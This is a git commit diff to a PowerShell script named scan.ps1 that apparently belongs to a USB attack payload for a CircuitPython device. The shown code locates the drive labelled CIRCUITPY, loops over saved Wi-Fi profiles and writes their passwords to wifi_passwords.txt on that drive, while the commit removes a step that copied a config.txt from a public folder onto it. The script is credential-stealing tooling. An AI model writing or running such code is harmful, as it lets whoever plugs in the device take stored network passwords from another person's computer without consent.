33c3af4e7d7703347325fb5e382c3a7e16029168
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-08 18:44:32 +0100

    Update scan.ps1

--- scan.ps1
+++ scan.ps1
@@ -1,9 +1,6 @@
 # Specify the volume name
 $volumeName = "CIRCUITPY"
 
-# Specify the path to look for config.txt
-$configFilePath = "C:\Users\Public\Music\config.txt"
-
 # Get the drive letter for the volume with the specified name
 $driveLetter = (Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq $volumeName }).DriveLetter
 
@@ -31,8 +28,3 @@ foreach ($profile in $profiles) {
 }
 
 $output | Out-File -FilePath "$driveletter\wifi_passwords.txt"
-
-if ($configfilepath){
-Copy-Item -Path $configFilePath -Destination "$driveLetter\config.txt" -Force
-Write-Host "config.txt copied to $($driveLetter)\config.txt"
-}
